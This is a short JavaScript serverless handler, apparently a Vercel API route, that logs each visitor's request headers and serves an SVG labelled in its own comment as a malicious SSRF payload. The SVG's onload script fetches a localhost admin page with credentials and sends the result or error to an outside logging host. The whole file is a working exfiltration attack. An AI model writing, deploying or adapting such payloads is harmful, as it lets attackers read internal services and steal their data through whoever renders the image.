export default function handler(req, res) {
  // Log the request
  console.log('SVG request received:', {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers
  });

  // Serve the malicious SVG with SSRF payload
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Cache-Control', 'no-store');
  
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="
  fetch('http://localhost:8080/admin', {credentials: 'include'})
    .then(response => response.text())
    .then(data => {
      fetch('https://ssrf-gold.vercel.app/api/log?data=' + encodeURIComponent(data))
    })
    .catch(error => {
      fetch('https://ssrf-gold.vercel.app/api/log?error=' + encodeURIComponent(error.message))
    });
">
  <rect width="100" height="100" fill="red"/>
  <text x="50" y="50" text-anchor="middle" fill="white" font-size="12">SSRF</text>
</svg>`;

  res.status(200).send(svgPayload);
}
